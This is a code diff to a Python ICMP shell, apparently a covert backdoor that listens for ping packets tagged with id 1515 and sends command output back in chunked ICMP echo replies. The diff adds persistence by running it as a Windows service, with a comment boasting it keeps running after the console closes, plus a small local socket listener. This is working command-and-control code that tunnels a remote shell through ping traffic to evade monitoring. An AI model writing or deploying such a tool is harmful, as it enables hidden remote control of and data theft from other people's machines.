@@ -12,7 +12,9 @@ import servicemanager
 import win32event
 import win32service
 from scapy.layers.inet import IP, ICMP
+from scapy.layers.l2 import Ether
 from scapy.sendrecv import sniff, send
+from win32con import DETACHED_PROCESS
 
 import ish_open
 import ishell
@@ -31,7 +33,7 @@ def split_string_by_bytes(input_string, byte_length):
 def packet_callback(packet):
     global output
     global error
-    if ICMP in packet and packet[ICMP].id == 1515 and packet[ICMP].payload.load.decode('utf-8') != (output or error):
+    if ICMP in packet and packet[ICMP].id == 1515 and packet[ICMP].type == 8:
         received_data = packet[ICMP].payload.load.decode('utf-8')
         print("-----+ IN DATA +------")
         print(received_data)
@@ -55,14 +57,14 @@ def packet_callback(packet):
             reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + "\n")
             send(reply_packet, verbose=False)
         else:
-            #data_list = split_string_by_bytes(output, 200)
-            #data_list.append('\n')
-            #for p in data_list:
-            #    reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / p
-            #    send(reply_packet, verbose=False)
-            #reply_packets = [IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in data_list]
-            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output)
-            send(reply_packet, verbose=False)
+            data_list = split_string_by_bytes(output, 200)
+            data_list.append('\n')
+            for p in data_list:
+                reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / p
+                send(reply_packet, verbose=False)
+        # reply_packets = [IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in data_list]
+        # reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output)
+        # send(reply_packet, verbose=False)
 
 
 def ish_listen():
@@ -147,6 +149,8 @@ def main():
         #    sys.exit(-1)
         sniff(filter="icmp", prn=packet_callback)
 
+        # I can now close the console or anything I want and long_run.py continues!
+
     # sniff(filter="icmp", prn=packet_callback)
 
 
@@ -215,12 +219,28 @@ class Service(win32serviceutil.ServiceFramework):
     def main(self):
         sniff(filter="icmp", prn=packet_callback)
 
+def server():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind(('localhost', 12345))
+    server_socket.listen(1)
+
+    print("Server listening on port 12345")
+
+    client_socket, addr = server_socket.accept()
+    print(f"Connection from {addr}")
+
+    data = client_socket.recv(100)
+    received_packet = Ether(data)
+    print(f"Received data: {received_packet.payload.load.decode('utf-8')}")
+
+    client_socket.close()
+    server_socket.close()
 
 if __name__ == '__main__':
-    main()
-    #if len(sys.argv) == 1:
-    #    servicemanager.Initialize()
-    #    servicemanager.PrepareToHostSingle(Service)
-    #    servicemanager.StartServiceCtrlDispatcher()
-    #else:
-    #    win32serviceutil.HandleCommandLine(Service)
+    #main()
+    if len(sys.argv) == 1:
+       servicemanager.Initialize()
+       servicemanager.PrepareToHostSingle(Service)
+       servicemanager.StartServiceCtrlDispatcher()
+    else:
+       win32serviceutil.HandleCommandLine(Service)
